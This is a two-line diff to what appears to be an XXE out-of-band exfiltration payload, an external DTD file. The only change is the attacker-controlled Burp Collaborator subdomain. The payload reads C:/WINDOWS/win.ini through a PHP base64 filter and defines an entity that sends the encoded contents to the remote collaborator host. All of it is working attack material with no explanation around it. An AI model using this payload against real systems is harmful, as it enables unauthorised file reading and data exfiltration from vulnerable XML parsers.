@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=C:/WINDOWS/win.ini">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://fdwvidemf4427b58mxbgjpqpfgl69v.burpcollaborator.net/xxe.dtd?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://1z1h4z081qqotxru8jx25bcb127tvi.burpcollaborator.net/xxe.dtd?%data;'>">
